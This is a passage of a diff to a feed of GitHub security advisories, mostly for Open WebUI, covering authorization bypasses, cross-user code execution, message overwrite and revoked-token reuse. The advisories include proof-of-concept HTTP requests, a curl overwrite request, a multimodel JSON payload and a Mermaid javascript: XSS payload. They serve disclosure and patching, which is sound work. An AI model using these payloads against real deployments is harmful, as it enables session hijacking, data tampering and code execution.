+    ttl=MODELS_CACHE_TTL,&#13;
+    key_builder=lambda _func, request, user=None: (&#13;
+        f'openai_all_models_{user.id}' if user else 'openai_all_models'&#13;
+    ),&#13;
+)&#13;
+```&#13;
+</description>
+      <guid isPermaLink="false">GHSA-3wp3-xxj9-5jqq</guid>
+      <pubDate>Thu, 02 Jul 2026 13:58:12 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] open-webui/open-webui – Upload `metadata.knowledge_id` bypasses the knowledge-base write-access check (read-only users can add files to KB)</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-7r7x-gjvr-448g</link>
+      <description># Open WebUI upload metadata can add files to knowledge bases without write permission&#13;
+&#13;
+## Summary&#13;
+&#13;
+Open WebUI's file upload background processing trusts the client-supplied `metadata.knowledge_id` value and inserts a `knowledge_file` association before validating that the uploading user has write access to the target knowledge base.&#13;
+&#13;
+A verified user with only read access to a knowledge base can upload an arbitrary file and set `metadata={"knowledge_id":"&lt;target knowledge id&gt;"}`. The normal `/api/v1/knowledge/{id}/file/add` endpoint correctly requires knowledge-base write access, but the upload auto-link path bypasses that authorization check.&#13;
+&#13;
+The immediate result is unauthorized modification of the target knowledge base's file membership. The attached attacker-controlled file becomes visible through `/api/v1/knowledge/{id}/files`, and readers/owners of that knowledge base can retrieve the file through the normal file endpoints because file access is derived from `KnowledgeFile` membership.&#13;
+&#13;
+## Affected Version&#13;
+&#13;
+- Repository: `open-webui/open-webui`&#13;
+- Tested source commit: `02dc3e689ceac915a870b373318b99c029ddf603`&#13;
+- Package version observed in `package.json`: `0.9.6`&#13;
+- Package name: `open-webui`&#13;
+&#13;
+## Impact&#13;
+&#13;
+A read-only knowledge-base collaborator can perform a write operation against that knowledge base by attaching arbitrary uploaded files.&#13;
+&#13;
+Security impact:&#13;
+&#13;
+- Unauthorized knowledge-base membership modification.&#13;
+- Integrity impact on shared knowledge-base file listings.&#13;
+- Attacker-controlled files become readable to other users who can read the target knowledge base.&#13;
+- If an owner/admin later reprocesses or globally reindexes the knowledge base, the unauthorized file can be indexed into the knowledge collection, turning the membership bypass into RAG/content poisoning.&#13;
+&#13;
+This is not an unauthenticated issue. It requires a verified Open WebUI account and a valid target knowledge-base ID. The clearest exploit path is a user who legitimately has read access to a knowledge base but not write access.&#13;
+&#13;
+## Source Evidence&#13;
+&#13;
+The normal single-file knowledge add endpoint checks write permission before processing or inserting the relationship:&#13;
+&#13;
+- `backend/open_webui/routers/knowledge.py`&#13;
+- `add_file_to_knowledge_by_id`&#13;
+- Lines 714-728 reject callers who are not owner, admin, or granted `write` access.&#13;
+- Lines 750-766 then process and insert the file only after that authorization gate.&#13;
+&#13;
+The upload auto-link path does not perform the same check:&#13;
+&#13;
+- `backend/open_webui/routers/files.py`&#13;
+- `process_uploaded_file`&#13;
+- Lines 178-186 read `knowledge_id` from upload metadata and immediately call `Knowledges.add_file_to_knowledge_by_id(...)`.&#13;
+- Lines 187-192 call `process_file(... collection_name=knowledge_id ...)` after the insert.&#13;
+&#13;
+The model method inserts the relationship without validating the caller's write access to the knowledge base:&#13;
+&#13;
+- `backend/open_webui/models/knowledge.py`&#13;
+- `add_file_to_knowledge_by_id`&#13;
+- Lines 646-677 create and commit a `KnowledgeFile` row for the supplied `knowledge_id`, `file_id`, and `user_id`.&#13;
+&#13;
+The later vector write check exists, but it runs too late:&#13;
+&#13;
+- `backend/open_webui/routers/retrieval.py`&#13;
+- `process_file`&#13;
+- Lines 1587-1592 call `_validate_collection_access(..., access_type='write')` when a collection is supplied.&#13;
+&#13;
+Because the unauthorized `KnowledgeFile` row is already committed before that check runs, the failed vector processing does not undo the knowledge-base file association. The upload code catches the exception at `backend/open_webui/routers/files.py` lines 194-195 and logs a warning while leaving the row in place.&#13;
+&#13;
+The unauthorized relationship affects file access decisions:&#13;
+&#13;
+- `backend/open_webui/utils/access_control/files.py`&#13;
+- `has_access_to_file`&#13;
+- Lines 41-53 grant file access when a file is associated with a knowledge base the user can access.&#13;
+&#13;
+So once the attacker's file is inserted into the target `KnowledgeFile` table, target knowledge-base readers/owners can see and fetch that file through normal knowledge/file routes.&#13;
+&#13;
+## Reproduction Steps&#13;
+&#13;
+Use a local Open WebUI instance with two verified users:&#13;
+&#13;
+1. As user `owner`, create a knowledge base.&#13;
+2. Grant user `reader` read access to the knowledge base, but do not grant write access.&#13;
+3. As `reader`, confirm the normal add-file endpoint is blocked:&#13;
+&#13;
+```http&#13;
+POST /api/v1/knowledge/&lt;knowledge_id&gt;/file/add&#13;
+Authorization: Bearer &lt;reader token&gt;&#13;
+Content-Type: application/json&#13;
+&#13;
+{"file_id":"&lt;reader-owned-file-id&gt;"}&#13;
+```&#13;
+&#13;
+Expected and observed behavior for the normal route: it rejects the request because `reader` lacks knowledge-base write access.&#13;
+&#13;
+4. As `reader`, upload a new file with the same target knowledge ID embedded in upload metadata:&#13;
+&#13;
+```http&#13;
+POST /api/v1/files/?process=true&amp;process_in_background=false&#13;
+Authorization: Bearer &lt;reader token&gt;&#13;
+Content-Type: multipart/form-data&#13;
+&#13;
+file=@attacker-note.txt&#13;
+metadata={"knowledge_id":"&lt;knowledge_id&gt;"}&#13;
+```&#13;
+&#13;
+5. Observe that the upload request succeeds and returns the uploaded file record.&#13;
+6. As `owner`, request the knowledge-base files:&#13;
+&#13;
+```http&#13;
+GET /api/v1/knowledge/&lt;knowledge_id&gt;/files&#13;
+Authorization: Bearer &lt;owner token&gt;&#13;
+```&#13;
+&#13;
+7. Observe that `attacker-note.txt` appears in the target knowledge base even though `reader` did not have write access.&#13;
+8. As `owner`, request the file content:&#13;
+&#13;
+```http&#13;
+GET /api/v1/files/&lt;attacker_file_id&gt;/content&#13;
+Authorization: Bearer &lt;owner token&gt;&#13;
+```&#13;
+&#13;
+9. Observe that the file is retrievable because `has_access_to_file` derives access from the unauthorized knowledge-base membership.&#13;
+&#13;
+## Expected Behavior&#13;
+&#13;
+The upload auto-link path should enforce the same authorization contract as `/api/v1/knowledge/{id}/file/add`:&#13;
+&#13;
+- The target knowledge base must exist.&#13;
+- The caller must be the knowledge owner, an admin, or have `write` access.&#13;
+- The supplied `directory_id`, if present, must belong to the target knowledge base.&#13;
+- The `KnowledgeFile` association should only be inserted after authorization and processing succeed.&#13;
+&#13;
+## Actual Behavior&#13;
+&#13;
+`metadata.knowledge_id` causes `Knowledges.add_file_to_knowledge_by_id(...)` to insert a `KnowledgeFile` row before write authorization is checked. The later collection write validation can fail, but the unauthorized membership row remains committed.&#13;
+&#13;
+## Suggested Fix&#13;
+&#13;
+Move knowledge-base authorization before the insert in the upload auto-link path. The upload path should share the same write-access and directory validation logic used by the dedicated knowledge endpoints.&#13;
+&#13;
+One safe pattern:&#13;
+&#13;
+1. Load the target knowledge base.&#13;
+2. Require owner/admin/write access before calling `Knowledges.add_file_to_knowledge_by_id`.&#13;
+3. Validate that `directory_id`, if supplied, belongs to the same knowledge base.&#13;
+4. Run vector processing before inserting the membership row, or wrap processing plus insertion in a transaction/compensating cleanup so a denied or failed process cannot leave a stale unauthorized row.&#13;
+&#13;
+</description>
+      <guid isPermaLink="false">GHSA-7r7x-gjvr-448g</guid>
+      <pubDate>Thu, 02 Jul 2026 13:39:00 +0000</pubDate>
+    </item>
+    <item>
+      <title>[HIGH] open-webui/open-webui – Cross-user code-interpreter and tool execution via unvalidated Socket.IO event-caller session_id</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-74h3-cxq7-vc5q</link>
+      <description>## Summary&#13;
+&#13;
+An authenticated low-privilege user can execute arbitrary code-interpreter Python and tools inside **another** user's authenticated session. The Socket.IO event-caller (`get_event_call`) delivers `execute:python` / `execute:tool` events to a **client-supplied** `session_id` after only checking that the session is connected, never that it belongs to the requester. Combined with `ydoc:document:join`, which exposes the live socket ids of everyone in a shared note's collaboration room to any read-access participant, an attacker can target a victim's session and run attacker-chosen code/tools in the victim's browser context. When the victim is an administrator, that hijacked context reaches the admin-only Functions API, whose source is executed server-side, yielding remote code execution as the server process (root in the default container).&#13;
+&#13;
+## Affected component&#13;
+&#13;
+- `backend/open_webui/socket/main.py` — `get_event_call()` / `__event_caller__`&#13;
+- `backend/open_webui/main.py` — chat-completion metadata (`session_id` taken from the request body)&#13;
+&#13;
+## Root cause&#13;
+&#13;
+The event-caller routes to a caller-controlled session id with no ownership check:&#13;
+&#13;
+```python&#13;
+# backend/open_webui/socket/main.py — get_event_call()&#13;
+async def __event_caller__(event_data):&#13;
+    session_id = request_info['session_id']&#13;
+    if session_id not in SESSION_POOL:                 # only checks the session is connected&#13;
+        return {'error': 'Client session disconnected.'}&#13;
+    return await sio.call('events', {...}, to=session_id, ...)   # delivered to that sid&#13;
+```&#13;
+&#13;
+`session_id` originates from the request body and is never validated against the authenticated user:&#13;
+&#13;
+```python&#13;
+# backend/open_webui/main.py&#13;
+metadata = {&#13;
+    'user_id': user.id,                               # server-derived (trustworthy)&#13;
+    'session_id': form_data.pop('session_id', None),  # client-controlled&#13;
+    ...&#13;
+}&#13;
+```&#13;
+&#13;
+`SESSION_POOL[session_id]` is the user record of whoever owns that socket. Because the caller checks only membership (`in SESSION_POOL`), a request carrying another user's `session_id` causes `execute:python` / `execute:tool` to be delivered to that other user's browser.&#13;
+&#13;
+## Reachability&#13;
+&#13;
+- `execute:python` / `execute:tool` are emitted from the code-interpreter and tool-call paths (`utils/middleware.py`, `tools/builtin.py`), all routed through `get_event_call`.&#13;
+- The victim's live `session_id` is disclosed to any read-access participant of a shared note via `ydoc:document:join`.&#13;
+- `POST /api/v1/chat/completions` requires only `get_verified_user` (the default user role). The attacker uses their own account and a model / Direct Connection they control to choose the payload.&#13;
+&#13;
+## Impact&#13;
+&#13;
+- **Any victim:** arbitrary code-interpreter Python and tool execution in the victim's authenticated session — the attacker acts with the victim's identity and origin (full session/account compromise).&#13;
+- **Admin victim:** the hijacked admin context reaches `POST /api/v1/functions/create`, whose source is `exec()`'d server-side → remote code execution as the server process (root in the default container).&#13;
+&#13;
+The Functions API is intended administrator code-execution; the vulnerability here is the cross-user delivery that lets an attacker drive another user's session — including an admin's — into it. The primitive is a full session compromise even against non-admin victims.&#13;
+&#13;
+## Proof of Concept&#13;
+&#13;
+The reporter's `exploit.py` reproduced on `ghcr.io/open-webui/open-webui:0.9.6` and a build of the `v0.9.6` tag, confirming blind server-side RCE out-of-band (callback returns `uid=0(root)`), using only a low-privilege `user` account that shared a note with an admin victim. Preconditions: code interpreter enabled; attacker shares a note with the victim; victim opens it while online; admin victim required for server RCE.&#13;
+&#13;
+## Fix&#13;
+&#13;
+`get_event_call` must verify the target session belongs to the requesting user before delivering, not merely that it is connected:&#13;
+&#13;
+```python&#13;
+session = SESSION_POOL.get(session_id)&#13;
+if session is None or session.get('id') != request_info.get('user_id'):&#13;
+    return {'error': 'Client session disconnected.'}&#13;
+```&#13;
+&#13;
+`user_id` in the request metadata is server-derived from the authenticated user, so it is trustworthy. Restricting `ydoc:document:join` so it does not disclose other participants' socket ids is recommended as defence-in-depth.&#13;
+&#13;
+## Affected / Patched&#13;
+&#13;
+- Affected: `&lt; 0.10.0` (last affected release 0.9.6)&#13;
+- Patched: v0.10.0. `get_event_call` now verifies the target session belongs to the requesting user before delivering (`session is None or session.get('id') != request_info.get('user_id')`), using the server-derived `user_id` from the request metadata. The recommended `ydoc:document:join` sid-disclosure restriction is defence-in-depth and independent of this fix; the ownership check closes the cross-user delivery regardless of whether the victim's sid is known.</description>
+      <guid isPermaLink="false">GHSA-74h3-cxq7-vc5q</guid>
+      <pubDate>Thu, 02 Jul 2026 13:20:56 +0000</pubDate>
+    </item>
+    <item>
+      <title>[HIGH] open-webui/open-webui – Cross-channel message overwrite via chat completion API (single-model and multimodel message_ids)</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-x2ff-v5v8-m75m</link>
+      <description>## Summary&#13;
+&#13;
+Any authenticated user can overwrite the content of a message in a channel they do not belong to (including private and DM channels) by sending a chat completion request with a `channel:`-prefixed `chat_id` and a target `message_id`. The `channel:` path routes pipeline output through `_make_channel_emitter`, which writes to the `Messages` table using the caller-supplied `message_id` without binding it to the channel.&#13;
+&#13;
+This advisory consolidates two filings of the same flaw: the original single-model form, and a multimodel `message_ids` variant that survives the partial fix shipped in v0.9.6 (see "Fix status" below).&#13;
+&#13;
+## Details (as introduced in v0.9.5)&#13;
+&#13;
+When a user submits a chat completion request with a `chat_id` starting with `channel:`, three authorization gaps combined in v0.9.5:&#13;
+&#13;
+1. **Ownership check skipped** (`main.py`): the `channel:` prefix caused the entire ownership/membership verification block to be skipped, with no channel membership/write check replacing it.&#13;
+&#13;
+```python&#13;
+if not chat_id.startswith('local:') and not chat_id.startswith('channel:'):  # temporary/channel chats are not stored&#13;
+    if is_new_chat:&#13;
+        ...&#13;
+    else:&#13;
+        if not await Chats.is_chat_owner(chat_id, user.id) and user.role != 'admin':&#13;
+            raise HTTPException(...)&#13;
+```&#13;
+&#13;
+2. **Message ID from user input**: `id` (and each value of the multimodel `message_ids` map) comes directly from the request body and is passed as `message_id` to the channel emitter.&#13;
+&#13;
+3. **Unchecked database write** (`socket/main.py` `_make_channel_emitter`):&#13;
+&#13;
+```python&#13;
+async def _make_channel_emitter(request_info):&#13;
+    channel_id = request_info['chat_id'].removeprefix('channel:')&#13;
+    message_id = request_info['message_id']  # user-supplied&#13;
+    ...&#13;
+    await Messages.update_message_by_id(message_id, update_form)  # no channel/user authz&#13;
+```&#13;
+&#13;
+`Messages.update_message_by_id` performs a direct primary-key update with no `channel_id`/`user_id` validation.&#13;
+&#13;
+## Fix (shipped in v0.10.0)&#13;
+&#13;
+v0.9.6 added a channel gate to the `channel:` branch (PR #24725) that closed the single-model path, but it validated only the first entry of the multimodel `message_ids` map, leaving the multimodel fan-out exploitable. v0.10.0 closes the remaining gap with two layers:&#13;
+&#13;
+1. **Request-time per-entry validation** (`backend/open_webui/main.py`): every entry of `message_ids` is validated against the target channel, not just the first; any entry whose target message does not belong to the channel in `chat_id` is rejected.&#13;
+2. **Fail-closed emitter** (`backend/open_webui/socket/main.py`, `_make_channel_emitter`): before writing, it re-reads the target message and returns without writing unless `msg.channel_id` matches the channel derived from `chat_id`. A missing or mismatched message is a no-op, so a write can no longer land in a channel the caller does not target.&#13;
+&#13;
+## PoC&#13;
+&#13;
+Single-model (fixed in v0.9.6):&#13;
+&#13;
+```bash&#13;
+curl -X POST http://target:8080/api/chat/completions \&#13;
+  -H "Authorization: Bearer $USER_JWT" -H "Content-Type: application/json" \&#13;
+  -d '{&#13;
+    "model": "llama3", "stream": true,&#13;
+    "chat_id": "channel:any-channel-uuid-here",&#13;
+    "id": "target-message-uuid-to-overwrite",&#13;
+    "messages": [{"role": "user", "content": "Repeat exactly: This message has been tampered with"}]&#13;
+  }'&#13;
+```&#13;
+&#13;
+Multimodel (still works on v0.9.6):&#13;
+&#13;
+```json&#13;
+POST /api/chat/completions&#13;
+{&#13;
+  "chat_id": "channel:&lt;attacker_channel_id&gt;",&#13;
+  "message_ids": {&#13;
+    "model-a": "&lt;message_id_in_attacker_channel&gt;",&#13;
+    "model-b": "&lt;victim_channel_message_id&gt;"&#13;
+  },&#13;
+  "messages": [{"role": "user", "content": "..."}]&#13;
+}&#13;
+```&#13;
+&#13;
+The first id passes channel scope validation; the second id is used by the per-model fan-out and overwrites the victim-channel message (with model output, or the provider-error string on a deterministic error). Even a failing model call writes error content to the target message.&#13;
+&#13;
+## Impact&#13;
+&#13;
+**Message integrity destruction:** an authenticated user can overwrite a message in a channel they cannot access, regardless of membership. The overwritten message retains the original author attribution while displaying attacker-chosen content (**impersonation**). Private channels, DM channels, and channels the attacker has no access to are all affected; the REST channel routes correctly return 403 for the same attacker, so the bypass is specific to the chat-completion channel pipeline.&#13;
+&#13;
+## Affected versions&#13;
+&#13;
+- Single-model path: introduced in commit `0037baeb2` (v0.9.5), fixed in v0.9.6 (#24725).&#13;
+- Multimodel `message_ids` path: present from v0.9.6, fixed in v0.10.0.&#13;
+- Consolidated Affected: `&gt;= 0.9.5, &lt; 0.10.0`. Patched: `&gt;= 0.10.0`.&#13;
+&#13;
+## Distinction from existing CVEs&#13;
+&#13;
+CVE-2026-45385 (GHSA-wwhq-cx22-f7vv) covered IDOR in the REST endpoint `POST /channels/{id}/messages/{message_id}/update` (`routers/channels.py`); its fix (commit `f5e110f`) only touched `channels.py`. This finding uses a different code path (`POST /api/chat/completions` with `chat_id: "channel:&lt;id&gt;"` → `main.py` → `socket/main.py:_make_channel_emitter`), untouched by that fix.&#13;
+&#13;
+## Suggested fix&#13;
+&#13;
+Validate **every** value in `message_ids` against the channel (not just the first), rejecting any whose target message does not belong to the channel in `chat_id`. Additionally, make `_make_channel_emitter` fail closed: re-check that the target message's `channel_id` matches the channel before calling `Messages.update_message_by_id`, treating a missing or mismatched message as an error/no-op.&#13;
+&#13;
+## Consolidation&#13;
+&#13;
+Per our Report Handling policy this advisory consolidates independent reports of the same chat-completions channel-overwrite flaw:&#13;
+&#13;
+- Single-model cross-channel overwrite via the `channel:` path: @sfwani (earliest filing).&#13;
+- Multimodel `message_ids` fan-out variant that bypasses the v0.9.6 first-id-only gate: @DavidCarliez.&#13;
+&#13;
+One CVE for the consolidated advisory.</description>
+      <guid isPermaLink="false">GHSA-x2ff-v5v8-m75m</guid>
+      <pubDate>Thu, 02 Jul 2026 12:52:22 +0000</pubDate>
+    </item>
+    <item>
+      <title>[HIGH] open-webui/open-webui – Realtime endpoints accept Redis-revoked JWTs after signout/backchannel logout</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-855v-hq7w-jmjw</link>
+      <description>## Summary&#13;
+&#13;
+With Redis configured, Open WebUI supports JWT revocation: `POST /api/v1/auths/signout` (per-token `jti`) and OIDC back-channel logout (per-user `revoked_at`) record revocations in Redis, and HTTP auth (`get_current_user`) rejects revoked tokens with 401. The realtime authentication surfaces do not perform this check: Socket.IO connect / user-join / join-channels / join-note and the terminal websocket first-message auth validate tokens with `decode_token()` only (signature + expiry). A JWT revoked by sign-out or back-channel logout therefore continues to authenticate new realtime connections, even though the same token is rejected on HTTP.&#13;
+&#13;
+## Affected component&#13;
+&#13;
+- `backend/open_webui/socket/main.py` — Socket.IO `connect`, `user-join`, `join-channels`, `join-note`&#13;
+- `backend/open_webui/routers/terminals.py` — terminal websocket first-message auth&#13;
+- `backend/open_webui/utils/auth.py` — the revocation check was applied to HTTP only&#13;
+&#13;
+## Root cause&#13;
+&#13;
+HTTP auth enforces revocation:&#13;
+&#13;
+```python&#13;
+# utils/auth.py — get_current_user&#13;
+if data.get('jti') and not await is_valid_token(request, data):&#13;
+    raise HTTPException(status_code=401, detail='Invalid token')&#13;
+```&#13;
+&#13;
+Realtime auth calls `decode_token()` only, which verifies signature + expiry but never consults the Redis revocation keys (`{prefix}:auth:token:{jti}:revoked`, `{prefix}:auth:user:{id}:revoked_at`):&#13;
+&#13;
+```python&#13;
+# socket/main.py — connect / user-join / join-channels / join-note&#13;
+data = decode_token(auth['token'])&#13;
+# routers/terminals.py — _resolve_authenticated_connection&#13;
+data = decode_token(token)&#13;
+```&#13;
+&#13;
+## Impact&#13;
+&#13;
+A JWT revoked by user sign-out or OIDC back-channel logout still authenticates new realtime connections. A stolen token therefore retains realtime access after the victim signs out or the IdP performs back-channel logout — the very remediation for a compromised token. The token can populate `SESSION_POOL` as the victim, join their user/channel/note rooms (receiving realtime channel messages, collaborative-note updates and presence), drive socket-level collaboration as the victim, and pass terminal websocket authentication when terminal servers are configured. HTTP remains correctly protected (401), so REST data and state-changing REST endpoints are not reachable with the revoked token.&#13;
+&#13;
+## Proof of Concept&#13;
+&#13;
+Reporter PoC on a Redis-backed deployment (v0.9.6 and main): after `POST /api/v1/auths/signout`, HTTP returns 401 for the token while a Socket.IO user-join with the same token still authenticates, and the terminal WS reaches terminal-server lookup rather than rejecting it as `Invalid token`.&#13;
+&#13;
+## Fix&#13;
+&#13;
+Apply the revocation check on the realtime paths. The logic is factored into `is_token_revoked(redis, decoded)` (covering per-token `jti` and per-user `revoked_at`); the Socket.IO handlers and the terminal WS reject tokens that fail it, using the main app Redis where revocations are stored. HTTP `is_valid_token` delegates to the same helper, so HTTP behaviour is unchanged.&#13;
+&#13;
+## Affected / Patched&#13;
+&#13;
+- Affected: `&gt;= 0.9.0, &lt; 0.10.0`, and only when Redis is configured (without Redis, per-token revocation is not supported and sign-out does not invalidate JWTs by design).&#13;
+- Patched: v0.10.0. The revocation check (`is_valid_token`, covering per-token `jti` and per-user `revoked_at`) is applied on Socket.IO connect / user-join / join-channels / join-note and the terminal websocket first-message auth, using the main app Redis where revocations are stored. HTTP `is_valid_token` delegates to the same logic, so HTTP behaviour is unchanged.</description>
+      <guid isPermaLink="false">GHSA-855v-hq7w-jmjw</guid>
+      <pubDate>Thu, 02 Jul 2026 12:41:09 +0000</pubDate>
+    </item>
     <item>
       <title>[MEDIUM] composer/composer – Path traversal in package bin field lets dependencies chmod arbitrary host files</title>
       <link>https://github.com/composer/composer/security/advisories/GHSA-gjfg-22fp-rrxx</link>
@@ -573,84 +1452,6 @@ An attacker with any valid account on a target Rocket.Chat instance can:&#13;
 3. **Sever Rocket.Chat Marketplace access** — workspace is no longer recognized; apps stop receiving updates or may be disabled</description>
       <guid isPermaLink="false">GHSA-8hhc-j325-rxqp</guid>
       <pubDate>Mon, 15 Jun 2026 23:32:37 +0000</pubDate>
-    </item>
-    <item>
-      <title>[MEDIUM] open-webui/open-webui – Authenticated users can target arbitrary configured Ollama backends via unguarded url_idx path parameter</title>
-      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-9rpj-v7hf-vv2w</link>
-      <description>## Summary&#13;
-&#13;
-Several direct, index-addressed Ollama proxy routes accept a caller-supplied `url_idx`&#13;
-path parameter and use it as a raw index into the admin-configured `OLLAMA_BASE_URLS`&#13;
-list. Access control on these routes validates only whether the user may use the&#13;
-requested *model*, never which *backend* the request is routed to. Any authenticated&#13;
-user can append an arbitrary `url_idx` to force their request onto an Ollama backend&#13;
-they were never authorized to reach, including internal, higher-privilege, or&#13;
-explicitly admin-disabled backends.&#13;
-&#13;
-## Affected endpoints&#13;
-&#13;
-All indexed Ollama routes that resolve the backend through `get_ollama_url()`:&#13;
-&#13;
-```&#13;
-POST /ollama/api/chat/{url_idx}&#13;
-POST /ollama/api/generate/{url_idx}&#13;
-POST /ollama/api/embed/{url_idx}&#13;
-POST /ollama/api/embeddings/{url_idx}&#13;
-POST /ollama/v1/chat/completions/{url_idx}&#13;
-POST /ollama/v1/completions/{url_idx}&#13;
-POST /ollama/v1/messages/{url_idx}&#13;
-POST /ollama/v1/responses/{url_idx}&#13;
-```&#13;
-&#13;
-## Root cause&#13;
-&#13;
-`backend/open_webui/routers/ollama.py` — `get_ollama_url()` consults the&#13;
-model-to-backend allow-list (`OLLAMA_MODELS[model]["urls"]`) only when `url_idx` is&#13;
-omitted. When the caller supplies `url_idx`, that mapping is skipped and the value is&#13;
-used directly as an index:&#13;
-&#13;
-```python&#13;
-async def get_ollama_url(request: Request, model: str, url_idx: Optional[int] = None):&#13;
-    if url_idx is None:&#13;
-        models = request.app.state.OLLAMA_MODELS&#13;
-        if model not in models:&#13;
-            raise HTTPException(...)&#13;
-        url_idx = random.choice(models[model].get("urls", []))&#13;
-    url = request.app.state.config.OLLAMA_BASE_URLS[url_idx]   # caller-controlled, no authz&#13;
-    return url, url_idx&#13;
-```&#13;
-&#13;
-The outbound request is then sent to that backend using the backend's own configured&#13;
-API key. Backends an admin has disabled (`OLLAMA_API_CONFIGS["&lt;idx&gt;"].enable = false`)&#13;
-are hidden from model discovery but remain reachable through the indexed route, because&#13;
-the disabled state is never re-checked at request time.&#13;
-&#13;
-## Impact&#13;
-&#13;
-A verified, non-admin user with read access to any single model can:&#13;
-- route requests to internal / higher-capability / restricted Ollama backends in&#13;
-  multi-backend deployments, bypassing backend-level isolation;&#13;
-- reach backends the admin has explicitly disabled;&#13;
-- have those requests authenticated with the target backend's configured API key&#13;
-  (the key is used server-side; it is not returned to the attacker);&#13;
-- consume the restricted backend's compute.&#13;
-&#13;
-There is no cross-user data disclosure and no exfiltration of the backend credential&#13;
-itself; the impact is unauthorized access to, and use of, restricted backend resources.&#13;
-&#13;
-## Affected / Patched&#13;
-&#13;
-- Affected: `&lt;= 0.9.5`&#13;
-- Patched: `&gt;= 0.9.6`&#13;
-&#13;
-## Fix&#13;
-&#13;
-0.9.6 adds `validate_ollama_backend_idx()`, invoked on every indexed route (directly and&#13;
-via `get_ollama_url()`), which returns 403 for any non-admin caller-supplied `url_idx`&#13;
-that is not in the requested model's allowed `urls`. Because disabled backends are absent&#13;
-from every model's `urls`, the same check also blocks routing to disabled backends.</description>
-      <guid isPermaLink="false">GHSA-9rpj-v7hf-vv2w</guid>
-      <pubDate>Thu, 11 Jun 2026 19:13:54 +0000</pubDate>
     </item>
     <item>
       <title>[MEDIUM] open-webui/open-webui – RAG ACL Bypass in Milvus Multitenancy Mode</title>
@@ -2191,63 +2992,6 @@ Fix validates `meta.knowledge` ownership on create, update, and import; blocking
       <pubDate>Thu, 11 Jun 2026 18:58:16 +0000</pubDate>
     </item>
     <item>
-      <title>[HIGH] open-webui/open-webui – Stored XSS in Mermaid Markdown Preview</title>
-      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-v8qj-hxv7-mgvv</link>
-      <description>## Summary&#13;
-&#13;
-Open WebUI renders Mermaid blocks from Markdown files in the file preview panel and inserts the generated SVG into the DOM using `innerHTML`.&#13;
-&#13;
-Because Mermaid is configured with `securityLevel: 'loose'`, attacker-controlled Mermaid content can be rendered unsafely in this flow. A working payload was validated through the Markdown preview path, resulting in JavaScript execution in the victim’s browser under the application origin.&#13;
-&#13;
-This is a confirmed stored XSS vulnerability reachable through normal product functionality.&#13;
-&#13;
-## Affected Version&#13;
-&#13;
-- `main`&#13;
-- Reproduced on `v0.8.12`&#13;
-&#13;
-## Category&#13;
-&#13;
-- CWE-79: Improper Neutralization of Input During Web Page Generation&#13;
-&#13;
-## Affected Code&#13;
-&#13;
-Mermaid is initialized in permissive mode:&#13;
-&#13;
-https://github.com/open-webui/open-webui/blob/9bd84258d09eefe7bf975878fb0e31a5dadfe0f8/src/lib/utils/index.ts#L1698&#13;
-The file preview path renders Mermaid output and injects the returned SVG into the DOM:&#13;
-&#13;
-https://github.com/open-webui/open-webui/blob/9bd84258d09eefe7bf975878fb0e31a5dadfe0f8/src/lib/components/chat/FileNav/FilePreview.svelte#L133&#13;
-&#13;
-## Impact&#13;
-&#13;
-A successful exploit allows JavaScript execution in the victim’s browser under the Open WebUI origin when a malicious Markdown file is opened in the preview panel.&#13;
-&#13;
-## PoC&#13;
-&#13;
-A malicious `.md` file containing the follwowing contents can be used to trigger the bug:&#13;
-````&#13;
-```mermaid&#13;
-flowchart LR&#13;
-  A[click me]&#13;
-  click A href "javascript:alert(document.domain)" "x"&#13;
-```&#13;
-````&#13;
-Steps to reproduce: &#13;
-1- Create a new chat &#13;
-2- Enable Code Interpreter and browse and upload the file with `.md` extension. &#13;
-&lt;img width="331" height="258" alt="image" src="https://github.com/user-attachments/assets/bce2b754-56d1-4da1-90a9-22bcb93269f2" /&gt;&#13;
-3- Clicking on the file, and clicking `click me` should pop an alert&#13;
-&lt;img width="1103" height="485" alt="image" src="https://github.com/user-attachments/assets/18754486-799b-434e-a2fc-dd7c09956a29" /&gt;&#13;
- &#13;
-&#13;
-## Remediation&#13;
-&#13;
-Since `mermaid` has `DOMPurify` as a built-in, it is recommended to use the `strict` mode instead of `loose`. </description>
-      <guid isPermaLink="false">GHSA-v8qj-hxv7-mgvv</guid>
-      <pubDate>Thu, 11 Jun 2026 18:58:03 +0000</pubDate>
-    </item>
-    <item>
       <title>[HIGH] open-webui/open-webui – Forged chat-file link allows cross-user file read and deletion</title>
       <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-vrhc-3fr6-pc3c</link>
       <description>## Summary&#13;
@@ -2910,66 +3654,6 @@ PoC artifacts (compose, attacker server, canary, run/verify scripts, full transc
 Matteo Panzeri â€” GitHub: `matte1782`, contact: `matteo1782@gmail.com`. Requesting CVE credit as **Matteo Panzeri**.</description>
       <guid isPermaLink="false">GHSA-226f-f24g-524w</guid>
       <pubDate>Thu, 11 Jun 2026 18:56:45 +0000</pubDate>
-    </item>
-    <item>
-      <title>[HIGH] open-webui/open-webui – Cross-origin postMessage confirmation bypass via action:submit</title>
-      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-3vv5-8xxp-4f55</link>
-      <description>As part of our research on improving our [AI pentest](https://www.aikido.dev/attack/aipentest), we have uncovered the following issue in Open WebUI. We've manually verified and tided up the report, but you can also find the original agent finding at the bottom of this report.&#13;
-&#13;
-### Summary&#13;
-&#13;
-The chat message listener allows non-same-origin `input:prompt` and `action:submit` messages, so an external site can set prompt text and trigger `submitPrompt()` in an authenticated victim session. I validated this with a cross-origin attacker page that auto-posted messages and caused unauthorized `POST /api/v1/chats/new` and `POST /api/chat/completions` requests containing attacker-controlled prompts. This enables cross-site forced actions and model/tool execution under victim privileges without consent.&#13;
-&#13;
-### Details&#13;
-&#13;
-The chat page's window message listener in `src/lib/components/chat/Chat.svelte` processes message types including `input:prompt` and `action:submit` without adequately enforcing same-origin restrictions. Based on code around lines ~597-616, input text is set directly from `event.data.text`; `action:submit` proceeds to `submitPrompt()` on the current prompt. The logic does not apply a strict origin allowlist and permits non-same-origin control of the chat input and submission flow, leading to cross-origin command execution in the victim's authenticated UI context. As a result, backend API calls (e.g., `POST /api/v1/chats/new`, `POST /api/chat/completions`) are sent under victim credentials.&#13;
-&#13;
